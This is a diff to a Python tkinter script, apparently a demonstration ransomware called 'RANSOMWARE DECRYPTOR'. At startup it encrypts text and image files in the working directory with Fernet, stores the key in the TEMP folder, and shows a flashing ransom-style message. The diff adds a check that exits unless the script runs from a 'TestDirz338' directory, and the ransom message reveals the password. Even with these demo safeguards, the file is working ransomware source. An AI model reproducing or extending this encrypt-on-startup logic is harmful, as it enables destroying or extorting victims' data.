@@ -1,25 +1,40 @@
-#!/usr/bin/env python3
 import os
 import tkinter as tk
+import sys
+from tkinter import messagebox
 from cryptography.fernet import Fernet, InvalidToken
 
-#function to generate encryption key
+
+#function to generate encryption key in TEMP folder
 def generate_encryption_key():
     key = Fernet.generate_key()
-    with open("encryption.key", "wb") as encryptionkey:
+
+    temp_dir = os.environ.get('TEMP') or os.environ.get('TMP')  #try to get TEMP or TMP environment variable
+    if not temp_dir:
+        temp_dir = '.'  #use current directory as a fallback if TEMP and TMP are not set
+
+    key_path = os.path.join(temp_dir, "encryption.key")
+
+    with open(key_path, "wb") as encryptionkey:
         encryptionkey.write(key)
 
 #load encryption key if it exists. generate one if it doesnt
 def load_encryption_key():
-    if not os.path.exists("encryption.key"):
+    temp_dir = os.environ.get('TEMP') or os.environ.get('TMP')
+    if not temp_dir:
+        temp_dir = '.' 
+
+    key_path = os.path.join(temp_dir, "encryption.key")
+
+    if not os.path.exists(key_path):
         generate_encryption_key()
 
-    with open("encryption.key", "rb") as encryptionkey:
+    with open(key_path, "rb") as encryptionkey:
         key = encryptionkey.read()
 
     return key
 
-#function to encrypt all files in the current directory
+#function to encrypt all given file extensions in the current directory
 ALLOWED_EXTENSIONS = {'.txt', '.jpg', '.jpeg', '.png'}
 
 def encrypt_files():
@@ -69,8 +84,8 @@ def decrypt_files():
                 with open(file, "wb") as thefile:
                     thefile.write(contents_decrypted)
 
-                result_label.config(text=f"Congratulations! \n Files decrypted:  {files}", fg="green", bg=bg_color)
-
+                result_label.config(text=f"Congratulations! \n Files decrypted: \n  {files}", fg="green", bg=bg_color)
+              
             except InvalidToken:
                 result_label.config(text=f"No files to decrypt", fg="black")
     else:
@@ -85,35 +100,34 @@ def color_change():
         message_label.config(bg="red")
     root.after(1000, color_change)
 
-#main window
+#check if launched from within "TestDirz338" directory
+current_directory = os.path.basename(os.getcwd())
+if current_directory != "TestDirz338":
+    #display an error message box if its not ran from 'TestDirz338' directory
+    messagebox.showerror("Error", "Please launch the script from within the 'TestDirz338' directory.")
+    sys.exit()
+	
 root = tk.Tk()
 root.title("RANSOMWARE DECRYPTOR")
-root.geometry("600x500")
+root.geometry("1000x700")
 bg_color = root.cget("bg")
 
-message_label = tk.Label(root, text="Unfortunately you've been hit by a ransomware :( this is only a demonstration so you don't have to pay anything to anybody. Password is lihapulla", wraplength=350, width=60, font=("Arial", 13))
+message_label = tk.Label(root, text="Unfortunately you've been hit by a ransomware :( This is only a demonstration so you don't have to pay anything to anybody.\n Password is lihapulla", wraplength=450, width=45, font=("Arial", 20))
 message_label.pack(pady=30)
 color_change()
 
-#result label
-result_label = tk.Label(root, text="", font=("Arial", 15), wraplength=350, width=60)
-result_label.pack(pady=50)
+result_label = tk.Label(root, text="", font=("Arial", 20), wraplength=350, width=40)
+result_label.pack(pady=55)
 
-#password label
-pw_label = tk.Label(root, text="Enter secret password to decrypt files", font=("Arial", 13))
+pw_label = tk.Label(root, text="Enter secret password to decrypt files", font=("Arial", 15))
 pw_label.pack(pady=2)
 
-#password text field
-pw_entry = tk.Entry(root, width=15, font=("Arial", 17), show="*")
+pw_entry = tk.Entry(root, width=15, font=("Arial", 15), show="*")
 pw_entry.pack(pady=2)
 
-#button to decrypt
-decrypt_button = tk.Button(root, text="Decrypt Files", font=("Arial", 13), command=decrypt_files)
+decrypt_button = tk.Button(root, text="Decrypt Files", font=("Arial", 14), command=decrypt_files)
 decrypt_button.pack(pady=5)
 
-#encrypt on startup
 encrypt_files()
 
-
 root.mainloop()
-
